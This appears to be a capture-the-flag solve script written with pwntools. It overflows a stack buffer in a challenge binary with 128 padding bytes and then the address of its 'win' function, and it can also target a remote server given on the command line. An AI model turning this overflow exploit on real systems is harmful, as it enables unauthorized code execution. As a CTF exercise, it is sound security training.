#!/usr/bin/env python3
from pwn import *

exe = './chall'

elf = context.binary = ELF(exe)
context.terminal = ['alacritty', '-e', 'zsh', '-c']

#context.log_level= 'DEBUG'

def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process(['qemu-arm', '-L', '/usr/arm-linux-gnueabi', exe])

gdbscript = '''
tbreak main
continue
'''.format(**locals())



### helper ###


#### Exploit starts here ####

io = start()

payload = b'A'*128
payload += p64(elf.symbols.win)

io.sendlineafter(b'message:',payload)

io.sendlineafter(b'message:',b'x')


io.interactive()
